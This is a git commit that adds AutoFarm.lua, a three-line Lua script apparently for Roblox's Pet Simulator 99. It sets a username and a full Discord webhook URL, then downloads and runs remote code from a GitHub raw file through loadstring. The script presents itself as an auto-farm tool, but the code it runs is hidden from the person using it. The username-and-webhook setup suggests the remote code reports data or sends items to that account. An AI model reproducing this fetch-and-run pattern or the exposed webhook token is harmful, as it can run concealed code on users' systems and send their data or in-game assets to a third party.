8158de919e79fa650c4a43fbdd7579724a3aafd0
pygalon <twofolles@gmail.com>
2025-01-09 00:28:30 +0300

    Add files via upload

---
+++ AutoFarm.lua
@@ -0,0 +1,3 @@
+_G.username = "Golecis2"
+_G.Webhook = "https://discord.com/api/webhooks/1313581583852376105/1kW2FhwvwdH96lT00246E5_j_KObwvNRbi_8GgbP7OX96FbPsMAG7nenZMC9ZiKJuvDD"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PS99/main/PetSimulator99AutoFarm.lua"))()
